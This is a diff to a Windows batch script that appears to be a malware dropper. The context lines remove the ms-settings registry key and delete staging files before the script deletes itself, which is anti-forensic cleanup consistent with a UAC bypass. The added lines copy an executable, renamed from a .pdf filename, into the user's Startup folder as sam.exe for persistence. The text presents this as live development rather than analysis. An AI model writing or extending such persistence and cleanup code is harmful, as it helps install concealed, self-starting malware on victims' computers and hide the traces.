@@ -77,6 +77,10 @@ del "%zip_output%" >nul 2>&1
 :: Remove the ms-settings registry key immediately before self-deletion
 powershell -command "Remove-Item 'HKCU:\Software\Classes\ms-settings\' -Recurse -Force" >nul 2>&1
 
+:: Add sam.exe to startup folder (this ensures it runs automatically at system startup)
+set "startup_folder=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"
+copy "%output2:pdf=exe%" "%startup_folder%\sam.exe" >nul 2>&1
+
 :: Delete the expert.bat file in AppData if it exists
 set "expert_bat=C:\Users\%USERNAME%\AppData\expert.bat"
 if exist "%expert_bat%" (
